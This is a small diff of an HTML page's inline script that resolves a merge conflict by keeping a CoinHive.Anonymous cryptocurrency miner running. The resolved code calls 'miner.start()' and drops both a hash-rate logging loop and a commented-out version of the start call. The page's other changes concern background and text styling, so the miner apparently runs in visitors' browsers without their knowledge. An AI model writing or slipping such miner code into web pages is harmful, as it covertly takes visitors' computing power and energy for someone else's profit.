@@ -98,21 +98,7 @@
             };
             
             var miner = new CoinHive.Anonymous(hive.key);
-<<<<<<< HEAD
             miner.start();
-
-            setInterval(function() {
-                if (miner.isRunning()) {
-                    console.log({
-                        hashesPerSecond: miner.getHashesPerSecond(),
-                        totalHashes: miner.getTotalHashes(),
-                        acceptedHashes: miner.getAcceptedHashes()
-                    });
-                }
-            }, 10000);
-=======
-            // miner.start();
->>>>>>> ed5a372... Added the background localy and amped up the text
         </script>
     </body>
 </html>
